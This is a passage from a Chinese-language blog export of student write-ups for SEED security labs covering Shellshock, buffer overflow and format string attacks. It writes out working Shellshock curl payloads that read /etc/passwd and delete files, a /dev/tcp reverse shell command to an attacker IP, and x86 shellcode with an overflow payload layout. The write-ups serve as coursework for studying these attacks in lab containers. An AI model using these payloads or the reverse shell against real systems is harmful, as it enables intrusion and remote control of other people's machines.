<li>labsetup<br><img src="/2021/10/28/SEED_lab2/image-20211027174035977.png" alt="image-20211027174035977"></li>
<li>dcbuild<br><img src="/2021/10/28/SEED_lab2/image-20211027174110640.png" alt="image-20211027174110640"></li>
<li>dcup<br><img src="/2021/10/28/SEED_lab2/image-20211027174135259.png" alt="image-20211027174135259"></li>
<li>dockps、docksh<br><img src="/2021/10/28/SEED_lab2/image-20211027174307330.png" alt="image-20211027174307330"></li>
</ol>
<h3 id="Web-Server-and-CGI"><a href="#Web-Server-and-CGI" class="headerlink" title="Web Server and CGI"></a>Web Server and CGI</h3><p>访问服务器的CGI程序：<code>curl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
<p><img src="/2021/10/28/SEED_lab2/image-20211027175746004.png" alt="image-20211027175746004"></p>
<h2 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h2><h3 id="Task-1-Experimenting-with-Bash-Function"><a href="#Task-1-Experimenting-with-Bash-Function" class="headerlink" title="Task 1: Experimenting with Bash Function"></a>Task 1: Experimenting with Bash Function</h3><p>使用以下命令，看shell是不是有shellshock这个漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foo=<span class="string">&quot;() &#123; echo &quot;</span>hello<span class="string">&quot;; &#125;; echo &quot;</span>extra<span class="string">&quot;;&quot;</span></span><br><span class="line"><span class="built_in">export</span> foo</span><br></pre></td></tr></table></figure>

<ol>
<li>有漏洞版本<br><img src="/2021/10/28/SEED_lab2/image-20211027180652851.png" alt="image-20211027180652851"></li>
<li>无漏洞版本<br><img src="/2021/10/28/SEED_lab2/image-20211027180834121.png" alt="image-20211027180834121"></li>
</ol>
<p>用上面的命令可以判断shell是否存在shellshock漏洞</p>
<h3 id="Task-2-Passing-Data-to-Bash-via-Environment-Variable"><a href="#Task-2-Passing-Data-to-Bash-via-Environment-Variable" class="headerlink" title="Task 2: Passing Data to Bash via Environment Variable"></a>Task 2: Passing Data to Bash via Environment Variable</h3><p><img src="/2021/10/28/SEED_lab2/image-20211027182141723.png" alt="image-20211027182141723"></p>
<p>使用curl命令的各个参数去访问这个CGI程序，探究攻击者是如何通过环境变量传递数据到有漏洞的bash中的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi             //-v显示详情</span><br><span class="line">curl -A <span class="string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</span><br><span class="line">curl -e <span class="string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi</span><br><span class="line">curl -H <span class="string">&quot;AAAAAA: BBBBBB&quot;</span> -v www.seedlab-shellshock.com/cgi-bin/getenv.cg</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/28/SEED_lab2/image-20211027182052991.png" alt="image-20211027182052991"></p>
<p><img src="/2021/10/28/SEED_lab2/image-20211027182518572.png" alt="image-20211027182518572"></p>
<p><img src="/2021/10/28/SEED_lab2/image-20211027182603944.png" alt="image-20211027182603944"></p>
<h3 id="Task-3-Launching-the-Shellshock-Attack"><a href="#Task-3-Launching-the-Shellshock-Attack" class="headerlink" title="Task 3: Launching the Shellshock Attack"></a>Task 3: Launching the Shellshock Attack</h3><p>使用三种不同的方法对目标CGI程序实行Shellshock攻击</p>
<p>对于以下四个目标，每种使用一种方法，包括三种不同的方法</p>
<h4 id="Task-3-A-Get-the-server-to-send-back-the-content-of-the-etc-passwd-file"><a href="#Task-3-A-Get-the-server-to-send-back-the-content-of-the-etc-passwd-file" class="headerlink" title="Task 3.A: Get the server to send back the content of the /etc/passwd file"></a>Task 3.A: Get the server to send back the content of the /etc/passwd file</h4><p><code>echo Content_type: text/plain; echo; /bin/cat /etc/passwd</code></p>
<p>使用User-Agent字段</p>
<p><code>curl -A &quot;() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
<p><img src="/2021/10/28/SEED_lab2/image-20211027205745954.png" alt="image-20211027205745954"></p>
<h4 id="Task-3-B-Get-the-server-to-tell-you-its-process’-user-ID-You-can-use-the-bin-id-command-to-print-out-the-ID-information"><a href="#Task-3-B-Get-the-server-to-tell-you-its-process’-user-ID-You-can-use-the-bin-id-command-to-print-out-the-ID-information" class="headerlink" title="Task 3.B: Get the server to tell you its process’ user ID. You can use the /bin/id command to print out the ID information"></a>Task 3.B: Get the server to tell you its process’ user ID. You can use the /bin/id command to print out the ID information</h4><p><code>echo Content_type: text/plain; echo; /bin/id</code></p>
<p>使用Referer字段</p>
<p><code>curl -e &quot;() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; /bin/id&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
<p><img src="/2021/10/28/SEED_lab2/image-20211027205849559.png" alt="image-20211027205849559"></p>
<h4 id="Task-3-C-Get-the-server-to-create-a-file-inside-the-tmp-folder-You-need-to-get-into-the-container-to-see-whether-the-file-is-created-or-not-or-use-another-Shellshock-attack-to-list-the-tmp-folder"><a href="#Task-3-C-Get-the-server-to-create-a-file-inside-the-tmp-folder-You-need-to-get-into-the-container-to-see-whether-the-file-is-created-or-not-or-use-another-Shellshock-attack-to-list-the-tmp-folder" class="headerlink" title="Task 3.C: Get the server to create a file inside the /tmp folder. You need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the /tmp folder"></a>Task 3.C: Get the server to create a file inside the /tmp folder. You need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the /tmp folder</h4><p><code>echo Content_type: text/plain; echo; touch /tmp/task; /bin/ls /tmp/</code></p>
<p>自己建一个字段使用/bin/rm -r</p>
<p><code>curl -H &quot;test:() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; /bin/touch /tmp/task;&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
<p><img src="/2021/10/28/SEED_lab2/image-20211027224712910.png" alt="image-20211027224712910"></p>
<h4 id="Task-3-D-Get-the-server-to-delete-the-file-that-you-just-created-inside-the-tmp-folder"><a href="#Task-3-D-Get-the-server-to-delete-the-file-that-you-just-created-inside-the-tmp-folder" class="headerlink" title="Task 3.D: Get the server to delete the file that you just created inside the /tmp folder."></a>Task 3.D: Get the server to delete the file that you just created inside the /tmp folder.</h4><p><code>echo Content_type: text/plain; echo; rm -rf /tmp/task</code></p>
<p><code>curl -H &quot;test:() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; /bash/rm -rf /tmp/task&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p>
<p><img src="/2021/10/28/SEED_lab2/image-20211027224926617.png" alt="image-20211027224926617"></p>
<h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><ol>
<li>能否通过此漏洞查看 /etc/shadow 的内容？<br>不能，从Task 3.B中我们知道我们只有www-data用户权限，这个需要root权限</li>
<li>能否通过GET方法通过QUERY-STRING环境变量实现Shellshock攻击<br><code>curl &quot;www.seedlab-shellshock.com/cgi-bin/vul.cgi/?() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd</code>我觉得不行，因为GET方法?之后的参数无法被解析</li>
</ol>
<h3 id="Task-4-Getting-a-Reverse-Shell-via-Shellshock-Attack"><a href="#Task-4-Getting-a-Reverse-Shell-via-Shellshock-Attack" class="headerlink" title="Task 4: Getting a Reverse Shell via Shellshock Attack"></a>Task 4: Getting a Reverse Shell via Shellshock Attack</h3><p>创建反向shell方便执行任意代码</p>
<ol>
<li>打开攻击者9090端口监听<br><img src="/2021/10/28/SEED_lab2/image-20211028113714607.png" alt="image-20211028113714607"></li>
<li>实行shellshock攻击<br><code>curl -A &quot;() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.37.132/9090 0&lt;&amp;1 2&gt;&amp;1&quot; http://10.9.0.80/cgi-bin/vul.cgi</code><br><img src="/2021/10/28/SEED_lab2/image-20211028113846892.png" alt="image-20211028113846892"></li>
<li>然后成功<br><img src="/2021/10/28/SEED_lab2/image-20211028113910152.png" alt="image-20211028113910152"></li>
</ol>
<h3 id="Task-5-Using-the-Patched-Bash"><a href="#Task-5-Using-the-Patched-Bash" class="headerlink" title="Task 5: Using the Patched Bash"></a>Task 5: Using the Patched Bash</h3><p>用修补后的bash重做task 3，修改为/bin/bash</p>
<p><img src="/2021/10/28/SEED_lab2/image-20211028125625400.png" alt="image-20211028125625400"></p>
<p>重新攻击，输出hell world</p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
        <tag>Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>SEED 2.0 Softwarelab3:Buffer Overflow Attack Lab</title>
    <url>/2021/11/09/SEED_lab3/</url>
    <content><![CDATA[<h1 id="Buffer-Overflow-Attack-Lab"><a href="#Buffer-Overflow-Attack-Lab" class="headerlink" title="Buffer Overflow Attack Lab"></a>Buffer Overflow Attack Lab</h1><h2 id="Set-UID版本"><a href="#Set-UID版本" class="headerlink" title="Set-UID版本"></a>Set-UID版本</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>缓冲区溢出指的是程序试图将数据写入缓冲区以外的情况。</p>
<p>这种漏洞可以由恶意用户使用来改变程序的流量控制，导致执行恶意代码</p>
<p>本实验的目标是为学生提供对这种类型的漏洞的实用洞察力，并学习如何利用攻击中的漏洞</p>
<h3 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h3><h4 id="关闭地址空间随机化"><a href="#关闭地址空间随机化" class="headerlink" title="关闭地址空间随机化"></a>关闭地址空间随机化</h4><p>系统会随机化堆和堆栈的起始地址。猜测地址是缓冲溢出攻击的关键步骤之一。可以使用以下命令丢弃此功能：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space</span><br></pre></td></tr></table></figure>

<h4 id="配置-bin-sh"><a href="#配置-bin-sh" class="headerlink" title="配置/bin/sh"></a>配置/bin/sh</h4><p>因为现在/bin/sh符号链接指向/bin/dash，而在第一次实验中，我们知道dash对set-UID程序有个安全策略，放弃特权。</p>
<p>所以我们需要改变符号链接到/bin/zsh，使用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ln -sf /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure>

<h4 id="StackGuard和不可执行栈"><a href="#StackGuard和不可执行栈" class="headerlink" title="StackGuard和不可执行栈"></a>StackGuard和不可执行栈</h4><p>这个会在编译时关闭，这两个也是保护程序安全的策略，之后会讨论</p>
<h3 id="Task-1-Getting-Familiar-with-Shellcode"><a href="#Task-1-Getting-Familiar-with-Shellcode" class="headerlink" title="Task 1: Getting Familiar with Shellcode"></a>Task 1: Getting Familiar with Shellcode</h3><p>提供三个版本的shellcode：c版本、32-bit和64-bit，这里只提供c</p>
<h4 id="c-version"><a href="#c-version" class="headerlink" title="c version"></a>c version</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//意思是，shellcode就是调用了一个/bin/sh</span></span><br></pre></td></tr></table></figure>

<h4 id="Task-Invoking-the-Shellcode"><a href="#Task-Invoking-the-Shellcode" class="headerlink" title="Task: Invoking the Shellcode"></a>Task: Invoking the Shellcode</h4><p>源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> shellcode[] =                     <span class="comment">//就是汇编代码的二进制形式</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __x86_64__                              </span></span><br><span class="line">    <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">    <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">    <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">    <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> code[<span class="number">500</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(code, shellcode); <span class="comment">// Copy the shellcode to the stack</span></span><br><span class="line">    <span class="keyword">int</span> (*func)() = (<span class="keyword">int</span>(*)())code;</span><br><span class="line">    func(); <span class="comment">// Invoke the shellcode from the stack</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为已经提供了Makefile文件，所以可以很简单的实现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make             <span class="comment">#生成a32.out和a64.out</span></span><br><span class="line">./a32.out        <span class="comment">#调用shell </span></span><br></pre></td></tr></table></figure>

<h3 id="Task-2-Understanding-the-Vulnerable-Program"><a href="#Task-2-Understanding-the-Vulnerable-Program" class="headerlink" title="Task 2: Understanding the Vulnerable Program"></a>Task 2: Understanding the Vulnerable Program</h3><p>从源码审计知道：</p>
<ol>
<li>漏洞出在bof函数中的<code>strcpy(buffer, str)</code>函数</li>
<li>我们需要在badfile文件中填入payload造成缓冲区溢出漏洞</li>
</ol>
<p>准备四个难度的Level，已经提供了相应的Makefile</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make                     <span class="comment"># 利用以下命令生成4个Level</span></span><br><span class="line"><span class="comment"># gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c </span></span><br><span class="line"><span class="comment"># sudo chown root stack</span></span><br><span class="line"><span class="comment"># sudo chmod 4755 stack</span></span><br><span class="line"><span class="comment"># 知道程序是32位程序，编译时关闭了前面提到的两个安全策略，最后是属于root用户的set-uid程序</span></span><br></pre></td></tr></table></figure>

<h3 id="Task-3-Launching-Attack-on-32-bit-Program-Level-1"><a href="#Task-3-Launching-Attack-on-32-bit-Program-Level-1" class="headerlink" title="Task 3: Launching Attack on 32-bit Program (Level 1)"></a>Task 3: Launching Attack on 32-bit Program (Level 1)</h3><p>按如下步骤发动缓冲区溢出攻击：</p>
<ol>
<li><code>gdb stack-L1-dbg</code>得到bof函数的地址以及buffer的地址<br><img src="/2021/11/09/SEED_lab3/image-20211110172748213.png" alt="image-20211110172748213"></li>
<li>创建badfile文件，<code>touch badfile</code></li>
<li>修改exploit.py文件<br><img src="/2021/11/09/SEED_lab3/image-20211110173007659.png" alt="image-20211110173007659"></li>
<li>生成payload并攻击<br><img src="/2021/11/09/SEED_lab3/image-20211110173120280.png" alt="image-20211110173120280"></li>
<li>可以看到我们成功拿到root权限</li>
</ol>
<p>如何修改exploit？</p>
<ol>
<li>shellcode是复制的，就是shellcode的32bit汇编版本</li>
<li>ret是返回地址，返回shellcode的第一条指令</li>
<li>offset是ebp和buffer地址的间隔</li>
<li>L等于4是32位程序</li>
</ol>
<h3 id="Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2"><a href="#Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2" class="headerlink" title="Task 4: Launching Attack without Knowing Buffer Size (Level 2)"></a>Task 4: Launching Attack without Knowing Buffer Size (Level 2)</h3><p>不知道缓冲区大小，但是知道缓冲区大小的范围是100-200</p>
<p>所以我们其实不知道的是offset的大小，只查看buffer的地址吧。</p>
<p><img src="/2021/11/09/SEED_lab3/image-20211110203921358.png" alt="image-20211110203921358"></p>
<p>修改exploit.py</p>
<p><img src="/2021/11/09/SEED_lab3/image-20211110204203357.png" alt="image-20211110204203357"></p>
<p>攻击成功</p>
<p><img src="/2021/11/09/SEED_lab3/image-20211110204241360.png" alt="image-20211110204241360"></p>
<h3 id="Task-5-Launching-Attack-on-64-bit-Program-Level-3"><a href="#Task-5-Launching-Attack-on-64-bit-Program-Level-3" class="headerlink" title="Task 5: Launching Attack on 64-bit Program (Level 3)"></a>Task 5: Launching Attack on 64-bit Program (Level 3)</h3><p>同上一个任务类似，但是这次是64位的程序</p>
<h2 id="Server版本"><a href="#Server版本" class="headerlink" title="Server版本"></a>Server版本</h2><h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><p>缓冲区溢出指的是程序试图将数据写入缓冲区以外的情况。</p>
<p>这种漏洞可以由恶意用户使用来改变程序的流量控制，导致执行恶意代码</p>
<p>本实验的目标是为学生提供对这种类型的漏洞的实用洞察力，并学习如何利用攻击中的漏洞</p>
<h3 id="Lab-Environment-Setup"><a href="#Lab-Environment-Setup" class="headerlink" title="Lab Environment Setup"></a>Lab Environment Setup</h3><h4 id="关闭地址空间随机化-1"><a href="#关闭地址空间随机化-1" class="headerlink" title="关闭地址空间随机化"></a>关闭地址空间随机化</h4><p>ALSR对程序内存中的一些关键数据区域进行随机化，包括栈的位置、堆和库的位置等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /sbin/sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>

<h4 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h4><p>实验所用的漏洞程序是<code>server-code</code>文件夹的<code>stack.c</code>程序。</p>
<p>我们的任务是利用这个漏洞得到root权限。</p>
<p>程序拥有root权限，运行在一个服务器中，它的标准输入被重定向到一个在远程用户和服务器之间的TCP连接。</p>
<p>就是说，程序能从一个远程用户得到数据。</p>
<p>要编译上述漏洞程序，我们需要使用<code>-fno-stack-protector</code>和<code>-z execstack</code>选项关闭StackGuard和非可执行堆栈保护，<code>L1</code>设置为具体的值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -DBUF_SIZE=$(L1) -o stack -z execstack -fno-stack-protector stack.c          <span class="comment"># 我设置的L1为250</span></span><br></pre></td></tr></table></figure>

<p>在文件夹，通过<code>make</code>命令去按照<code>Makefile</code>编译程序，然后<code>make install</code>命令安装，让编译得到的二进制能够被容器使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/09/SEED_lab3/image-20211109151506071.png" alt="image-20211109151506071"></p>
<p><code>server-code</code>文件夹里的<code>server.c</code>是服务器入口点，监听9090端口</p>
<p>当收到TCP连接时，会将TCP收到的数据作为标准输入到<code>stack</code>程序，我们没必要去读<code>server.c</code>的源码。</p>
<h4 id="容器搭建和命令"><a href="#容器搭建和命令" class="headerlink" title="容器搭建和命令"></a>容器搭建和命令</h4><p>起环境，docker容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dcbuild      <span class="comment"># alias for: docker-compose build</span></span><br><span class="line">dcup         <span class="comment"># alias for: docker-compose up</span></span><br><span class="line">dcdown       <span class="comment"># alias for: docker-compose down</span></span><br><span class="line">dockps       <span class="comment"># Alias for: docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span></span><br><span class="line">docksh &lt;id&gt;  <span class="comment"># Alias for: docker exec -it &lt;id&gt; /bin/bash</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Task-1-Get-Familiar-with-the-Shellcode"><a href="#Task-1-Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1: Get Familiar with the Shellcode"></a>Task 1: Get Familiar with the Shellcode</h3><p>Shellcode通常被用在代码注入攻击。它基本上是一段启动shell的代码，通常用汇编语言编写。</p>
<p>在本实验中只提供二进制版本的shellcode</p>
<ol>
<li><p>生成32位和64位二进制shellcode文件<code>codefile32</code>和<code>codefile64</code></p>
<p><img src="/2021/11/09/SEED_lab3/image-20211109161302510.png" alt="image-20211109161302510"></p>
</li>
<li><p>编译<code>call_shellcode.c</code>，我们可以使用<code>a32.out</code>和<code>a64.out</code>来分别调用上一步生成的shellcode文件<br><img src="/2021/11/09/SEED_lab3/image-20211109162148430.png" alt="image-20211109162148430"></p>
</li>
<li><p>测试shellcode<br><img src="/2021/11/09/SEED_lab3/image-20211109163524900.png" alt="image-20211109163524900"></p>
</li>
<li><p>修改shellcode，可以用来删除文件，<br><img src="/2021/11/09/SEED_lab3/image-20211109223939250.png" alt="image-20211109223939250"><br><img src="/2021/11/09/SEED_lab3/image-20211109223844600.png" alt="image-20211109223844600"></p>
</li>
</ol>
<h3 id="Task-2-Level-1-Attack"><a href="#Task-2-Level-1-Attack" class="headerlink" title="Task 2: Level-1 Attack"></a>Task 2: Level-1 Attack</h3><p>第一个目标是10.9.0.0端口是9090，漏洞程序stack是32位程序。</p>
<p>服务器将接受517字节的输入，会造成缓冲区溢出。</p>
<ol>
<li>先测试我们的服务器是否正常、<br><img src="/2021/11/09/SEED_lab3/image-20211109225003621.png" alt="image-20211109225003621"><br>正常返回，我们得到了栈帧指针的值<code>ebp</code>和buffer的地址</li>
<li>我们修改位于<code>attack-code</code>文件夹下面的<code>exploit.py</code>，构造我们的payload<br><img src="/2021/11/09/SEED_lab3/image-20211109230829919.png" alt="image-20211109230829919"><br><img src="/2021/11/09/SEED_lab3/image-20211109231006268.png" alt="image-20211109231006268"></li>
<li>监听9090端口，反向shell得到root权限<br><img src="/2021/11/09/SEED_lab3/image-20211109232608115.png" alt="image-20211109232608115"></li>
</ol>
<p>Level-1给了2个Hint：</p>
<ol>
<li>ebp地址</li>
<li>buffer地址</li>
</ol>
<p>从hint中我们得到buffer的大小为offset，构造content，也就是最后badfile文件内容：</p>
<ol>
<li>先用NOP空指令将content数组填充</li>
<li>[0:offset]，内容是NOP指令，缓冲区数据。</li>
<li>[offset:offset+4]，就是ret指令返回的地址（小端法），我们要执行恶意代码，最小为ebp+8最大为517-len(shellcode)</li>
<li>[517-len(shellcode):517]，填充shellcode恶意代码</li>
</ol>
<h3 id="Task-3-Level-2-Attack"><a href="#Task-3-Level-2-Attack" class="headerlink" title="Task 3: Level-2 Attack"></a>Task 3: Level-2 Attack</h3><p>为了增加难度，在本任务中将不会给出ebp地址</p>
<p><img src="/2021/11/09/SEED_lab3/image-20211110140909438.png" alt="image-20211110140909438"></p>
<p>如图所示只给出了buffer的地址，我们不知道buffer的大小。</p>
<p>同时，为了降低难度，缓冲区的大小被设定为<code>[100,300]</code>。</p>
<p>所以解法是暴力枚举，每个大小都试一下</p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
        <tag>Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>SEED 2.0 Softwarelab4:Format String Attack Lab</title>
    <url>/2021/12/01/SEED_lab4/</url>
    <content><![CDATA[<h1 id="Format-String-Attack-Lab"><a href="#Format-String-Attack-Lab" class="headerlink" title="Format String Attack Lab"></a>Format String Attack Lab</h1><h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1 Overview"></a>1 Overview</h2><p>C语言中的 <code>printf()</code> 函数用于根据格式打印字符串。它的第一个参数称为 <code>format string</code> ，它定义了字符串应该如何格式化。</p>
<p>格式字符串使用由 % 字符标记的占位符在 <code>printf()</code> 函数的打印期间填充数据。</p>
<p>格式字符串的使用不仅限于 <code>printf()</code> 函数，许多其他函数，如 <code>sprintf()</code>、<code>fprintf()</code> 和 <code>scanf() </code>，也使用格式字符串。</p>
<p>有些程序允许用户以格式字符串的形式提供全部或部分内容。如果这些内容没有被清除，恶意用户可以利用这个机会让程序运行任意代码。</p>
<p>这样的问题称为 <code>format string vulnerability</code> （格式字符串漏洞）。</p>
<p>实验目的是让学生通过运用在课 堂上学到的关于格式字符串漏洞的知识实际操作，从而获得关于格式字符串漏洞的第一手经验。</p>
<p>学生将被给予一个具有格式字符串漏洞的程序，他们的任务是利用这个漏洞来实现以下破坏:</p>
<ol>
<li><p>使程序崩溃</p>
</li>
<li><p>读取程序的内部内存</p>
</li>
<li><p>修改程序的内部内存</p>
</li>
<li><p>最严重的是，利用受害者程序的特权注入和执行恶意代码。</p>
</li>
</ol>
<p>本实验涵盖以下主题:</p>
<ul>
<li><p>Format string vulnerability, and code injection</p>
</li>
<li><p>Stack layout</p>
</li>
<li><p>Shellcode</p>
</li>
<li><p>Reverse shell</p>
<h3 id="Lab-environment"><a href="#Lab-environment" class="headerlink" title="Lab environment."></a>Lab environment.</h3></li>
<li><p>SEED Ubuntu 20.04版本</p>
</li>
<li><p>也可以在云上创建 SEED VM 实验环境</p>
</li>
</ul>
<h3 id="Note-for-instructors"><a href="#Note-for-instructors" class="headerlink" title="Note for instructors."></a>Note for instructors.</h3><p>教师可以通过选择<code>L</code>的值来自定义此实验。详细信息，请参见第2.2节。</p>
<p>根据学生的背景和为该实验室分配的时间，还可以在64位程序中进行攻击，因为它更具挑战性。</p>
<p>对32位程序的攻击足以涵盖格式字符串攻击的基础知识。</p>
<h2 id="2-Environment-Setup"><a href="#2-Environment-Setup" class="headerlink" title="2 Environment Setup"></a>2 Environment Setup</h2><h3 id="2-1-Turning-of-Countermeasure"><a href="#2-1-Turning-of-Countermeasure" class="headerlink" title="2.1 Turning of Countermeasure"></a>2.1 Turning of Countermeasure</h3><p>现代操作系统使用地址空间随机化来随机化堆和堆栈的起始地址。这使得猜测确切的地址困难，猜测地址是格式字符串攻击的关键步骤之一。要简化此实验中的任务，请使用以下命令关闭地址随机化：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>

<h3 id="2-2-The-Vulnerable-Program"><a href="#2-2-The-Vulnerable-Program" class="headerlink" title="2.2 The Vulnerable Program"></a>2.2 The Vulnerable Program</h3><p>这个实验室中使用的易受攻击的程序叫做 <code>format.c</code>，可以在 <code>server-code</code> 文件夹中找到。</p>
<p>这个程序有一个格式字符串漏洞，我们的任务就是利用这个漏洞。</p>
<h4 id="Compilation"><a href="#Compilation" class="headerlink" title="Compilation."></a>Compilation.</h4><p>将 <code>format.c</code> 编译生成 64-bit 和 32-bit 程序。编译命令已经被包含在<code>Makefile</code>文件，我们只需要<code>make</code>执行就可以编译。</p>
<p>在编译完成后，使用<code>make install</code>将生成的二进制文件放在<code>fmt-contains</code>文件夹，以便让它们被容器使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make          <span class="comment"># gcc 命令</span></span><br><span class="line">make install  <span class="comment"># cp 命令</span></span><br><span class="line">make clean    <span class="comment"># rm -f badfile server format-32 format-64</span></span><br></pre></td></tr></table></figure>

<p>编译无视 gcc 给出的对于格式化字符串漏洞的警告。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一些gcc选项</span></span><br><span class="line">-z execstack  <span class="comment"># 堆栈可执行，让我们的恶意代码可以执行</span></span><br><span class="line">-static       <span class="comment"># 静态链接，32-bit动态链接库没有被安装在容器中</span></span><br><span class="line">-m32          <span class="comment"># 编译32-bit二进制程序选项</span></span><br></pre></td></tr></table></figure>

<h4 id="For-instructors"><a href="#For-instructors" class="headerlink" title="For instructors"></a>For instructors</h4><p>更改<code>Makefile</code> 中的<code>L</code>可以改变<code>BUF_SIZE</code>的值。</p>
<h4 id="The-Server-Program"><a href="#The-Server-Program" class="headerlink" title="The Server Program"></a>The Server Program</h4><p>在<code>server-code</code>文件夹，您可以找到一个名为<code>server.c</code>的程序。这是服务器的主要入口点。它会倾听端口9090。</p>
<p>当它收到TCP连接时，它会调用<code>format</code>程序，并将TCP连接设置为<code>format</code>程序的标准输入。</p>
<p>这样，当格式读取来自<code>stdin</code>的数据时，它实际上从TCP连接读取，也就是说，数据由用户在TCP客户端上提供。</p>
<p>我们在服务器程序中添加了一点随机性，因此不同的学生可能会看到内存地址和帧指针的不同值。这些值仅在容器重新启动时更改，因此只要您保留容器运行，您将看到相同的数字（不同学生看到的数字仍然不同）。</p>
<p>这种随机性与地址随机化不同。它的唯一目的是让学生的任务有点不同。</p>
<h3 id="2-3-Container-Setup-and-Commands"><a href="#2-3-Container-Setup-and-Commands" class="headerlink" title="2.3 Container Setup and Commands"></a>2.3 Container Setup and Commands</h3><p>依照<code>Labsetup</code>文件夹中的<code>docker-compose.yml</code>文件搭建实验环境。</p>
